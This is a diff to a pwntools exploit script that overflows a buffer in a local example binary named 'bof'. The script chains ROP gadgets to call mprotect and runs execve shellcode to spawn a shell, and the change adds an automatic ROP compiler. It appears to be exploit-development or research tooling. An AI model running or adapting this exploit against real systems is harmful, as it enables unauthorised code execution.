@@ -1,7 +1,9 @@
 import sys
 from pwn import *
+import ropme
 
-p = process(['./bof','3000'])
+filename = './example/bof'
+p = process([filename,'3000'])
 #gdb.attach(p)
 
 line = p.readline()
@@ -19,6 +21,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
  +  "\xb0\x3b"                                      # mov    $0x3b, %al
  +  "\x0f\x05"                                      # syscall
 )
+target_address = buffer_address + 1024
 
 if len(sys.argv) < 2: # manual mode
   POP_RDI = 0x40063f # pop rdi ; ret
@@ -29,7 +32,6 @@ if len(sys.argv) < 2: # manual mode
   POP_R9  = 0x40064c # pop r9 ; ret
   MPROTECT = 0x400520
 
-  target_address = buffer_address + 1024
   target_page = target_address & ~0xfff
 
   rop = (
@@ -46,7 +48,7 @@ if len(sys.argv) < 2: # manual mode
     + p64(target_address)
   )
 else:
-  rop = "AUTOMATIC" # TODO get rop compiler output
+  rop = ropme.rop_to_shellcode([(filename, 0x4000000)], target_address)
 
 payload = 'A'*512 + 'B'*8 + rop
 payload += ((1024 - len(payload)) * 'B') + shellcode
